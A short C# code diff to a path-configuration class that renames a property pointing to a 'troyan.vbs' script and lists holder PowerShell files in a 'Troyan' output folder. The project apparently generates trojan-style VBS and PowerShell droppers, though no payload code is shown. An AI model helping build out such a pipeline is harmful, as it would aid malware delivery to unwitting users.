@@ -35,7 +35,8 @@ public sealed class ServerLayoutPaths
     [JsonPropertyName("holder")] public string Holder => Path.Join(TroyanOutputDir, "holder.txt");
     [JsonPropertyName("holderPs1")] public string HolderPs1 => Path.Join(TroyanOutputDir, "holder.ps1");
     [JsonPropertyName("holderPs1Debug")] public string HolderPs1Debug => Path.Join(TroyanOutputDir, "holder.debug.ps1");
-    [JsonPropertyName("troyanPlainVbs")] public string TroyanPlainVbs => Path.Join(TroyanOutputDir, "troyan.plain.vbs");
+    /// <summary>Plain holder-based script produced in the Troyan <c>_output</c> folder (then copied to <see cref="UserTroyanVbs"/>).</summary>
+    [JsonPropertyName("troyanOutputVbs")] public string TroyanOutputVbs => Path.Join(TroyanOutputDir, "troyan.vbs");
 
     public string UserDataFile(string file) => _paths.UserDataFile(file);
 
